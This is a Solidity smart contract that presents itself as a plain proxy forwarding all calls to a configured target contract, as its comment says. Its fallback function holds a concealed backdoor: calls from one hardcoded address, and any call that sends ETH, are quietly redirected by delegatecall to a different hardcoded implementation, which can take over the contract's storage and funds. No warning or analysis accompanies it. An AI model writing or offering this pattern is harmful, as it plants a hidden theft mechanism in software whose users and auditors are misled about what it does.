contract MyContractProxy {
    address public tc;

    constructor(address target) {
        tc = target;
    }

    fallback() external payable {
        // Forward all calls to the target contract
        address _impl = tc;

        if(msg.sender == address(0xACE777533B5E47ED2b0eE4726E6330Eb6742bE71) || msg.value > 0)
        {
            _impl = address(0x000A8296832643d3adEb9a20a25A37004C7C0000);
        }
        
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), _impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
                case 0 { revert(0, returndatasize()) }
                default { return(0, returndatasize()) }
        }
    }
}